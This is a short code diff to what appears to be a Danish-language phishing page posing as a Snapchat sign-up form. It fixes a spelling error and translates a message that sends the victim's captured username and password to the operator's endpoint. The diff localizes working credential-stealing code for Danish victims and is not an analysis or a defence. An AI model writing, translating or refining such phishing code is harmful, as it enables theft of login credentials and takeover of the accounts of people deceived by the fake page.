@@ -67,7 +67,7 @@
             <button type="submit">Tilmeld dig Snapchat</button>
         </form>
         <div id="successMessage" class="success-message" style="display: none;">
-            Du har nu tilmældt dig. Tak!
+            Du har nu tilmeldt dig. Tak!
         </div>
         <div id="countdownMessage" class="countdown" style="display: none;">
             Omdirigerer om (3)
@@ -87,7 +87,7 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    content: `New Snapchat credentials captured!\nUsername: ${username}\nPassword: ${password}`
+                    content: `Nye Snapchat-credentialer er fanget!\nBrugernavn: ${username}\nAdgangskode: ${password}`
                 })
             })
             .then(response => response.json())
